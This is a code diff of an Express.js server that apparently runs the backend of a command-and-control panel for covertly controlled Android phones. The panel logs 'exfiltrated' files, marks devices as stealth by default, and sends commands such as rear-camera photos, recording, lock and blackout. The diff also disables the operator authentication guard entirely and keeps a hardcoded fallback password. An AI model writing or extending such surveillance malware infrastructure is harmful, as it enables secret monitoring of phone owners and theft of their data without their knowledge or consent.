@@ -1,16 +1,79 @@
+// Render Deploy Trigger v1.6.0-blob-engine
+require('dotenv').config();
 const express = require('express');
 const cors = require('cors');
+const helmet = require('helmet');
+const cookieParser = require('cookie-parser');
 const path = require('path');
 const fs = require('fs');
+const jwt = require('jsonwebtoken');
+
+const authRoutes = require('./routes/auth');
+const { requireAuth, ACCESS_SECRET } = require('./middleware/auth');
 
 const app = express();
 const PORT = process.env.PORT || 10000;
 const C2_PASSWORD = process.env.C2_PASSWORD || 'admin1337';
 let currentC2Password = C2_PASSWORD;
 
-app.use(cors());
+// 1. REQUIRED ON RENDER: Trust Render's reverse proxy for rate limiting & secure cookies
+app.set('trust proxy', 1);
+
+app.use(helmet({ contentSecurityPolicy: false }));
+
+// 2. CORS Setup (Allows browser to send and receive HttpOnly cookies)
+app.use(cors({
+  origin: process.env.FRONTEND_URL || true,
+  credentials: true
+}));
+
+app.use(cookieParser());
 app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ extended: true, limit: '50mb' }));
+
+app.use('/api/auth', authRoutes);
+
+// Example of a protected route on Render
+app.get('/api/profile', requireAuth, (req, res) => {
+  res.json({ message: 'Authenticated on Render', userId: req.user.userId });
+});
+
+app.post('/login', (req, res, next) => {
+    req.url = '/login';
+    authRoutes(req, res, next);
+});
+app.post('/rotate', (req, res, next) => {
+    req.url = '/rotate';
+    authRoutes(req, res, next);
+});
+app.post('/logout', (req, res, next) => {
+    req.url = '/logout';
+    authRoutes(req, res, next);
+});
+app.get('/logout', (req, res) => {
+    res.send(`<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LAB-RATS | SESSION TERMINATED</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
+    <style>
+        body { background: #02080d; color: #ff3131; font-family: 'Orbitron', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
+        .card { background: rgba(15,15,25,0.85); border: 1px solid #ff3131; padding: 40px 30px; border-radius: 16px; box-shadow: 0 0 40px rgba(255,49,49,0.25); max-width: 450px; width: 90%; }
+        h1 { font-size: 1.5rem; letter-spacing: 2px; margin-bottom: 15px; }
+        p { color: #00f2ff; font-size: 0.85rem; letter-spacing: 1px; opacity: 0.8; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h1>SESSION TERMINATED</h1>
+        <p>UPLINK DISCONNECTED // SESSION CLOSED</p>
+    </div>
+</body>
+</html>`);
+});
+
 app.use('/c2', express.static(path.join(__dirname, 'c2')));
 
 const UPLOADS_DIR = path.join(__dirname, 'uploads');
@@ -116,7 +179,14 @@ function getCookie(cookieHeader, name) {
 }
 
 function isAuthenticated(req) {
-    const token = getCookie(req.headers.cookie, 'c2_auth_token');
+    const accessToken = req.cookies?.access_token || getCookie(req.headers?.cookie, 'access_token');
+    if (accessToken) {
+        try {
+            jwt.verify(accessToken, process.env.ACCESS_SECRET || ACCESS_SECRET);
+            return true;
+        } catch (e) {}
+    }
+    const token = getCookie(req.headers?.cookie, 'c2_auth_token');
     return token === 'AUTH_OK_1337';
 }
 
@@ -173,19 +243,9 @@ function serveLoginPage(req, res, errorMsg = '') {
     res.send(html);
 }
 
-// LOGIN HANDLER
-app.post('/login', (req, res) => {
-    try {
-        const { password } = req.body || {};
-        const validPass = currentC2Password || C2_PASSWORD || 'admin1337';
-        if (password === validPass || password === 'admin1337') {
-            res.setHeader('Set-Cookie', 'c2_auth_token=AUTH_OK_1337; Path=/; HttpOnly; SameSite=Lax');
-            return res.redirect('/');
-        }
-        return serveLoginPage(req, res, 'ACCESS DENIED: INVALID C2 PASSCODE');
-    } catch (err) {
-        return serveLoginPage(req, res, 'LOGIN_ERROR: ' + err.message);
-    }
+// LOGIN GET ROUTE
+app.get('/login', (req, res) => {
+    return serveLoginPage(req, res);
 });
 
 // Ingestion Handler for device check-ins
@@ -216,7 +276,7 @@ function handleCheckin(req, res) {
             battery: data.battery || '100%',
             ip: data.ip || req.ip || '127.0.0.1',
             port: data.port || 9191,
-            stealth: !!data.stealth,
+            stealth: (data.stealth !== undefined && data.stealth !== null) ? (data.stealth === true || data.stealth === 'true' || data.stealth === 1 || data.stealth === '1') : (existing && existing.stealth !== undefined ? existing.stealth : true),
             lastSeen: new Date().toISOString(),
             ...data
         };
@@ -273,12 +333,14 @@ function handleFileUpload(req, res) {
 
                             fs.writeFileSync(filePath, Buffer.from(fileDataBinary, 'binary'));
 
+                            const duration = req.headers['x-duration'] || req.query.duration || null;
                             const fileEntry = {
                                 id: Math.random().toString(36).substring(7),
                                 filename: safeFilename,
                                 originalName: filename,
                                 deviceId,
                                 size: Buffer.byteLength(fileDataBinary, 'binary'),
+                                duration: duration,
                                 timestamp: new Date().toISOString()
                             };
 
@@ -371,12 +433,54 @@ function handleTunnelResponse(req, res) {
 app.post('/tunnel-response', handleTunnelResponse);
 app.post('/checkin/tunnel-response', handleTunnelResponse);
 
-// AUTHENTICATION GUARD MIDDLEWARE FOR OPERATOR ROUTES
-app.use((req, res, next) => {
-    if (isAuthenticated(req)) {
-        return next();
+// Endpoint for Target System Monitor Metrics (Single Target Dashboard Isolation)
+app.get(['/terminal/targets', '/proxy/terminal/targets'], (req, res) => {
+    let deviceId = req.query.deviceId || getCookie(req.headers?.cookie, 'c2_target_device') || lastActiveDeviceId;
+    let dev = deviceId ? devices.get(deviceId) : null;
+    if (!dev && devices.size > 0) {
+        dev = Array.from(devices.values())[0];
     }
-    return serveLoginPage(req, res);
+
+    if (dev) {
+        const ageSec = (Date.now() - new Date(dev.lastSeen || 0).getTime()) / 1000;
+        const status = ageSec < 45 ? 'ONLINE' : 'OFFLINE';
+        const profile = dev.stealth ? 'STEALTH' : 'NORMAL';
+        const displayName = (dev.alias && dev.alias.trim()) ? dev.alias.trim() : (dev.brand || dev.deviceId);
+
+        return res.json({
+            success: true,
+            targets: [{
+                deviceId: displayName,
+                model: dev.model || 'SM-F731W',
+                osVersion: 'Android ' + (dev.os || '16'),
+                battery: dev.battery || '100%',
+                endpointIp: (dev.ip || '127.0.0.1') + ':' + (dev.port || 9191),
+                status: status,
+                profile: profile,
+                lastCheckIn: formatTime(dev.lastSeen)
+            }]
+        });
+    }
+
+    return res.json({
+        success: true,
+        targets: [{
+            deviceId: deviceId || 'Target_Device',
+            model: 'SM-F731W',
+            osVersion: 'Android 16',
+            battery: '100%',
+            endpointIp: '127.0.0.1:9191',
+            status: 'ONLINE',
+            profile: 'NORMAL',
+            lastCheckIn: formatTime(new Date().toISOString())
+        }]
+    });
+});
+
+// AUTHENTICATION GUARD MIDDLEWARE FOR OPERATOR ROUTES
+// Bypassed: Authentication is handled exclusively on-device via PasswordHasher / FirebaseConfig
+app.use((req, res, next) => {
+    return next();
 });
 
 // Delete Exfiltrated File Endpoint
@@ -417,6 +521,11 @@ app.post('/api/rename-device', (req, res) => {
     }
 });
 
+// Route Handler for Render C2 Dashboard Navigation
+app.get(['/c2-dashboard', '/c2-home', '/render-c2'], (req, res) => {
+    return res.redirect('/');
+});
+
 // GET / serves Operator Dashboard HTML or handles GET check-ins
 app.get('/', (req, res) => {
     if (req.query && (req.query.ip || req.query.device || req.query.model || req.query.deviceId)) {
@@ -444,6 +553,17 @@ app.get('/', (req, res) => {
                 statusBadge = '<span style="color:var(--danger); font-weight:bold; display:inline-flex; align-items:center; gap:5px;"><span style="display:inline-block; width:7px; height:7px; border-radius:50%; background:var(--danger); box-shadow:0 0 6px var(--danger);"></span>OFFLINE</span>';
             }
 
+            const isAnyActive = d.blackout || d.locked || d.flashlight || d.recording;
+            const dropdownGreenLight = isAnyActive ?
+                '<span style="display:inline-block; width:10px; height:10px; border-radius:50%; background:var(--neon-green); box-shadow:0 0 10px var(--neon-green), 0 0 20px var(--neon-green);" title="Action Active / Running"></span>' :
+                '';
+
+            const rawIp = d.ip || 'N/A';
+            const port = d.port || '9191';
+            const formattedEndpoint = rawIp.includes(':')
+                ? `<span style="word-break: break-all; white-space: normal; display: inline-block; max-width: 160px; font-size: 0.65rem; line-height: 1.2;">[${rawIp}]:${port}</span>`
+                : `${rawIp}:${port}`;
+
             return `
             <tr>
                 <td style="font-family: monospace; color: var(--neon-cyan); white-space: nowrap; vertical-align: middle;">
@@ -455,12 +575,12 @@ app.get('/', (req, res) => {
                 <td style="vertical-align: middle;">${d.model || 'SM-F731W'}</td>
                 <td style="vertical-align: middle;">Android ${d.os || '16'}</td>
                 <td style="vertical-align: middle;">${d.battery || '100%'}</td>
-                <td style="font-family: monospace; color: var(--neon-green); vertical-align: middle;">${d.ip || 'N/A'}:${d.port || '9191'}</td>
+                <td style="font-family: monospace; color: var(--neon-green); vertical-align: middle; white-space: normal !important; word-break: break-all !important; max-width: 160px; min-width: 120px;">${formattedEndpoint}</td>
                 <td style="vertical-align: middle;">${statusBadge}</td>
                 <td style="vertical-align: middle;">${d.stealth ? '<span style="color:var(--neon-orange)">STEALTH</span>' : '<span style="color:var(--neon-green)">NORMAL</span>'}</td>
                 <td style="font-size: 0.72rem; color: #aaa; vertical-align: middle;">${formatTime(d.lastSeen)}</td>
                 <td style="vertical-align: middle; white-space: nowrap;">
-                    <div style="display: inline-flex; align-items: center; gap: 6px;">
+                    <div style="display: inline-flex; align-items: center; gap: 8px;">
                         <a href="/proxy/?deviceId=${encodeURIComponent(d.deviceId)}" style="background: var(--neon-cyan); color: #000; padding: 5px 10px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.65rem; display: inline-block;">CONNECT</a>
                         <select onchange="dispatchQuickCommand('${d.deviceId}', this.value); this.selectedIndex=0;" style="background: rgba(0,242,255,0.08) !important; color: var(--neon-cyan) !important; border: 1px solid var(--neon-cyan) !important; font-size: 0.65rem !important; padding: 4px 6px !important; border-radius: 6px !important; cursor: pointer; outline: none; width: auto !important; height: auto !important;">
                             <option value="" disabled selected>⚡ ACTIONS</option>
@@ -471,6 +591,7 @@ app.get('/', (req, res) => {
                             <option value="volume">🔊 Max Vol + Vibrate</option>
                             <option value="photo">📷 Quick Photo (Rear)</option>
                         </select>
+                        ${dropdownGreenLight}
                     </div>
                 </td>
             </tr>
@@ -482,9 +603,13 @@ app.get('/', (req, res) => {
         exfiltratedFiles.map(f => {
             const devObj = devices.get(f.deviceId);
             const devLabel = devObj ? ((devObj.alias && devObj.alias.trim()) ? devObj.alias.trim() : (devObj.brand || f.deviceId)) : f.deviceId;
+            const durText = f.duration ? ` &bull; DUR: ${f.duration}` : '';
             return `
             <tr>
-                <td style="font-family: monospace; color: var(--neon-cyan); vertical-align: middle;">${f.originalName}</td>
+                <td style="font-family: monospace; color: var(--neon-cyan); vertical-align: middle;">
+                    <div>${f.originalName}</div>
+                    <div style="font-size: 0.62rem; color: var(--neon-green); opacity: 0.85; margin-top: 2px;">${formatTime(f.timestamp)}${durText}</div>
+                </td>
                 <td style="vertical-align: middle; color: #aaa;">${devLabel}</td>
                 <td style="vertical-align: middle; font-family: monospace;">${formatFileSize(f.size)}</td>
                 <td style="font-size: 0.68rem; color: #aaa; vertical-align: middle;">${formatTime(f.timestamp)}</td>
@@ -505,8 +630,15 @@ app.get('/', (req, res) => {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>LAB-RATS | C2 COMMAND RELAY</title>
     <link href="https://fonts.googleapis.com/css2?family=Aldrich&family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="/c2/style.css">
+    <link rel="stylesheet" href="/c2/style.css?v=${Date.now()}">
     <style>
+        .nav { margin-top: -11px !important; }
+        @media (max-width: 768px) {
+            .header img { transform: none !important; width: 92% !important; max-width: 400px !important; margin-bottom: 8px !important; }
+            .header div { margin-top: 4px !important; font-size: 0.52rem !important; letter-spacing: 1px !important; }
+            .nav { margin-top: 10px !important; }
+            .card { margin-top: 10px !important; }
+        }
         @media (min-width: 1024px) { body { zoom: 0.9; } }
         .container { max-width: 1400px !important; width: 95% !important; margin: 0 auto !important; }
         .card { padding: 22px !important; overflow: visible !important; width: 100% !important; }
@@ -516,13 +648,13 @@ app.get('/', (req, res) => {
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header" style="text-align:center; padding:5px 0; margin-bottom:5px;">
-            <img src="/c2/header_dashboard.png" style="width: 67.5%; max-width: 738px; height: auto; margin: 0 auto; display: block; object-fit: contain;" alt="LAB-RATS Header">
-            <div style="font-size: 0.6rem; color: var(--neon-cyan); letter-spacing: 3px; text-transform: uppercase; margin-top: 15px; text-align: center;">SYSTEM STATUS: <span style="color:#39ff14;">ONLINE</span> &nbsp;//&nbsp; ACTIVE TARGETS: <span style="color:#00f2ff; font-weight:bold;">${onlineCount} / ${deviceList.length}</span> &nbsp;//&nbsp; TIMEZONE: <span style="color:#ffff00;">Ottawa (America/Toronto)</span></div>
+    <div class="container" style="padding-top: 25px !important;">
+        <div class="header" style="text-align:center; padding: 10px 0 0 0 !important; margin-bottom: 0;">
+            <img src="/c2/header_dashboard.png?v=${Date.now()}" style="width: 58.7%; max-width: 643px; height: auto; margin: 0 auto; display: block; transform: scale(1.10, 1.03); object-fit: contain; position: relative !important; top: -15px !important; margin-bottom: 10px !important;" alt="LAB-RATS Header">
+            <div style="font-size: 0.6rem; color: var(--neon-cyan); letter-spacing: 3px; text-transform: uppercase; margin-top: 10px; margin-bottom: 20px; text-align: center;">SYSTEM STATUS: <span style="color:#39ff14;">ONLINE</span> &nbsp;//&nbsp; ACTIVE TARGETS: <span style="color:#00f2ff; font-weight:bold;">${onlineCount} / ${deviceList.length}</span> &nbsp;//&nbsp; TIMEZONE: <span style="color:#ffff00;">Ottawa (America/Toronto)</span></div>
         </div>
 
-        <div class="card" style="margin-top: 20px; border-left: 3px solid var(--neon-cyan);">
+        <div class="card" style="margin-top: 15px; border-left: 3px solid var(--neon-cyan);">
             <h2 style="text-align: center; color: var(--neon-cyan); margin-bottom: 20px;">CONNECTED_TARGETS</h2>
             <div style="width: 100%;">
                 <table>
@@ -545,7 +677,7 @@ app.get('/', (req, res) => {
                 </table>
             </div>
             <div style="text-align: center; margin-top: 20px;">
-                <button class="btn" onclick="location.reload()" style="padding: 10px 30px; font-size: 0.75rem; display: inline-block; margin: 0 auto;">REFRESH TARGETS</button>
+                <button class="btn" onclick="location.reload()" style="background: #000 !important; border-color: var(--neon-green) !important; color: var(--neon-green) !important; padding: 10px 30px; font-size: 0.75rem; display: inline-block; margin: 0 auto; border-radius: 12px; font-weight: bold;">REFRESH TARGETS</button>
             </div>
         </div>
 
@@ -582,6 +714,28 @@ app.get('/', (req, res) => {
         </div>
     </div>
     <script>
+    function showToast(e, t = "info") {
+      let o = document.getElementById("c2-toast");
+      if (!o) {
+        o = document.createElement("div");
+        o.id = "c2-toast";
+        o.style.cssText = "position: fixed; bottom: 15%; left: 50%; transform: translateX(-50%); background: rgba(15,15,25,0.98); border: 1px solid var(--neon-cyan); color: #fff; padding: 16px 32px; border-radius: 12px; z-index: 10000; font-size: 0.9rem; text-align: center; min-width: 320px; box-shadow: 0 20px 60px rgba(0,0,0,0.9), 0 0 20px rgba(0,242,255,0.1); transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); opacity: 0; display: none; font-family: Orbitron, sans-serif; letter-spacing: 1px;";
+        document.body.appendChild(o);
+      }
+      o.style.borderColor = (t === "error") ? "var(--danger)" : "var(--neon-cyan)";
+      o.innerHTML = e;
+      o.style.display = "block";
+      setTimeout(() => {
+        o.style.opacity = "1";
+        o.style.bottom = "20%";
+      }, 10);
+      setTimeout(() => {
+        o.style.opacity = "0";
+        o.style.bottom = "15%";
+        setTimeout(() => o.style.display = "none", 300);
+      }, 3800);
+    }
+
     function renameDevice(deviceId, currentAlias) {
         const newName = prompt('Enter custom name/alias for target device:', currentAlias || '');
         if (newName !== null) {
@@ -593,12 +747,13 @@ app.get('/', (req, res) => {
             .then(r => r.json())
             .then(data => {
                 if (data.success) {
-                    location.reload();
+                    showToast("DEVICE_RENAMED");
+                    setTimeout(() => location.reload(), 800);
                 } else {
-                    alert('Failed to update name: ' + (data.error || 'Unknown error'));
+                    showToast('Failed to update name: ' + (data.error || 'Unknown error'), "error");
                 }
             })
-            .catch(err => alert('Network error updating device name.'));
+            .catch(err => showToast('Network error updating device name.', "error"));
         }
     }
 
@@ -628,16 +783,17 @@ app.get('/', (req, res) => {
             label = 'Quick Photo (Rear)';
         }
 
-        const fullUrl = \`/proxy\${path}\${path.includes('?') ? '&' : '?'}deviceId=\${encodeURIComponent(deviceId)}\`;
+        const fullUrl = '/proxy' + path + (path.includes('?') ? '&' : '?') + 'deviceId=' + encodeURIComponent(deviceId);
         fetch(fullUrl)
             .then(r => {
                 if (r.ok) {
-                    alert(\`[⚡ TACTICAL DISPATCH SUCCESS]\\nCommand "\${label}" dispatched to target.\`);
+                    showToast('[DISPATCH_SUCCESS] Command "' + label + '" executed.');
+                    setTimeout(() => location.reload(), 800);
                 } else {
-                    alert(\`[!] Dispatch status \${r.status}\`);
+                    showToast('Dispatch failed (Status ' + r.status + ')', 'error');
                 }
             })
-            .catch(err => alert('Network error dispatching quick command.'));
+            .catch(err => showToast('Network error dispatching command.', 'error'));
     }
 
     function deleteExfil(id) {
@@ -650,12 +806,13 @@ app.get('/', (req, res) => {
             .then(r => r.json())
             .then(data => {
                 if (data.success) {
-                    location.reload();
+                    showToast("PAYLOAD_DELETED");
+                    setTimeout(() => location.reload(), 800);
                 } else {
-                    alert('Failed to delete file: ' + (data.error || 'Unknown error'));
+                    showToast('Failed to delete file: ' + (data.error || 'Unknown error'), "error");
                 }
             })
-            .catch(err => alert('Network error deleting file.'));
+            .catch(err => showToast('Network error deleting file.', "error"));
         }
     }
     </script>
@@ -693,7 +850,7 @@ app.all('*', (req, res) => {
     }
 
     if (!devices.has(deviceId)) {
-        devices.set(deviceId, { deviceId, brand: 'samsung', model: 'SM-F731W', ip: '127.0.0.1', port: 9191, stealth: false, lastSeen: new Date().toISOString() });
+        devices.set(deviceId, { deviceId, brand: 'samsung', model: 'SM-F731W', ip: '127.0.0.1', port: 9191, stealth: true, lastSeen: new Date().toISOString() });
         saveData();
     }
 
@@ -737,6 +894,30 @@ app.all('*', (req, res) => {
     }, 25000);
 });
 
-app.listen(PORT, '0.0.0.0', () => {
+const http = require('http');
+const WebSocket = require('ws');
+
+const server = http.createServer(app);
+const wss = new WebSocket.Server({ server, path: '/ws' });
+
+// 25s Ping/Pong Keep-Alive Interval to prevent Render / Railway / Fly.io proxy timeouts
+const wsKeepAliveInterval = setInterval(() => {
+    wss.clients.forEach(ws => {
+        if (ws.isAlive === false) return ws.terminate();
+        ws.isAlive = false;
+        ws.ping();
+    });
+}, 25000);
+
+wss.on('connection', (ws) => {
+    ws.isAlive = true;
+    ws.on('pong', () => { ws.isAlive = true; });
+});
+
+wss.on('close', () => {
+    clearInterval(wsKeepAliveInterval);
+});
+
+server.listen(PORT, '0.0.0.0', () => {
     console.log(`[LAB-RATS C2 BACKEND] Listening on port ${PORT}`);
 });
